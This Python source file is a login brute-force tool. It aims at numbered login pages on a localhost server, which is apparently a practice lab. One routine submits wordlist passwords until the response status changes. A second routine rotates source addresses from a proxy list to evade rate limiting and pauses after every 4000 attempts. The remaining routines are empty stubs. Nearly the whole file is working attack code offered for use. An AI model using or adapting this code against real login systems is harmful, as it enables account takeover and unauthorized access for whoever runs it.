# imports
import time
import timeit
import requests
import http.client
from termcolor import colored


'''
	Login forum bruteforce class:
		each login forum has implements different techniques
		to evade the implemented login forum security
'''
class Attack():
	def __init__(self):
		# url of website
		self.url = 'http://localhost:8000'

		# username to bruteforce
		self.username = ''

		# list of proxies
		self.proxies = [line.strip() for line in open('proxies', 'r')]

		# list of commonly used passwords
		self.passwords = [line.strip() for line in open('passwords', 'r')]

		self.select()


	# select login forum to try to attack
	def select(self):

		# get login forum and username
		route = input('Login forum number [1, 5]: ')
		self.username = input('Username to attack: ')
		self.url = f'{self.url}/login_{route}'

		# launch attack
		if route == '1':
			self.forum_1()

		if route == '2':
			# measure execution time 
			execution_time = timeit.timeit(self.forum_2, number=1)
			print(f"Execution Time: {execution_time} seconds")
			# self.forum_2()


	# bruteforce login forum #1
	def forum_1(self):

		# try each password until success status
		index = 0
		for p in self.passwords:
			# create login data
			data = {
				'username': self.username,
				'password': p,
			}

			# send the request
			response = requests.post(self.url, data=data)

			# verify login status
			if response.status_code != 204:
				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : {self.username, p}')
				break
			else:
				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
				print(f'{c} : {self.username, p}')

			index += 1


	# bruteforce login forum #2
	def forum_2(self):

		index = 0
		proxy_index = 0
		attempted = 0

		# try each password until success status
		for p in self.passwords:
			# use proxy address to bypass rate limit
			proxy = self.proxies[proxy_index]  

			# create login data
			data = f'username={self.username}&password={p}'

			# Create a custom socket to bind proxy address
			custom_socket = http.client.HTTPConnection('localhost', 8000, source_address=(proxy, 0))

			# send request
			custom_socket.request('POST', '/login_2', body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

			# # verify login status
			response = custom_socket.getresponse()
			status_code = response.status
			attempted += 1

			if status_code != 204:
				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : {self.username, p}')
				break
			else:
				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
				print(f'{c} : {self.username, p}')

			# close socket
			custom_socket.close()

			# sleep for about a minute every 4000 requests
			if attempted % 4000 == 0: 
				c = '[' + colored('Sleeping', 'yellow', attrs=['bold', 'underline']) + ']'
				print(f'\n{c} : Attempted 4000 logins for user: {self.username}')
				attempted = 0
				time.sleep(75)

			# rotate to the next proxy
			proxy_index = (proxy_index + 1) % len(self.proxies)
			index += 1


	# bruteforce login forum #3
	def forum_3(self):
		pass

	# bruteforce login forum #4
	def forum_4(self):
		pass

	# bruteforce login forum #5
	def forum_5(self):
		pass



# start
if __name__ == '__main__':
	attack = Attack()